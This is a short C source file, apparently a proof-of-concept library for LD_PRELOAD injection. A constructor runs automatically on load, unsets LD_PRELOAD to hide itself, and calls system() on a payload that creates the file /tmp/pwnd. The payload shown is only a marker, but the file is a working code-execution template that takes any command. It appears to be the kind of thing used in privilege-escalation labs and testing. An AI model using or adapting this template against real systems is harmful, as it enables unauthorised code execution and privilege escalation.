#include <unistd.h>
#include <stdlib.h>

void payload(void){
    system("touch /tmp/pwnd");
}
__attribute__ ((__constructor__)) void exec(void){
    if (getenv("LD_PRELOAD") == NULL){ return; }
    unsetenv("LD_PRELOAD");
    payload();
    return;
}
